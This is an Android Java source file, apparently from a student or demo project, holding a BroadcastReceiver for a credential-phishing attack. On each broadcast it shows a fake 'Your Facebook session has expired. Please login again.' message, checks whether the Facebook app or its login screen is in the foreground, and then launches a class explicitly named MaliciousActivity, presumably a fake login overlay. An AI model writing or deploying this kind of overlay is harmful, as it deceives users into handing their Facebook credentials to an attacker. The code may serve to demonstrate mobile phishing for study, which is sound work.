package com.www.pongers_263;

import android.app.ActivityManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;
import android.widget.Toast;

import java.util.List;

/**
 * Created by winniewu on 11/27/15.
 */

public class MyReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        Log.e("www", "receiver received broadcast");
        Toast.makeText(context, "Your Facebook session has expired. Please login again.",
                Toast.LENGTH_LONG).show();

        ActivityManager activityManager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        List<ActivityManager.RunningTaskInfo> runningTasks =  activityManager.getRunningTasks(1);

        if ("com.facebook.katana".equals(runningTasks.get(0).topActivity.getPackageName())) {
            Log.e("www", "facebook was opened");
        }

        if ("com.facebook.katana/com.facebook.katana.FacebookLoginActivity".equals(runningTasks.get(0).topActivity.flattenToString())) {
            Log.e("www", "trying to login to facebook!");
        }

        Intent i = new Intent(context, MaliciousActivity.class);
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(i);

    }
}

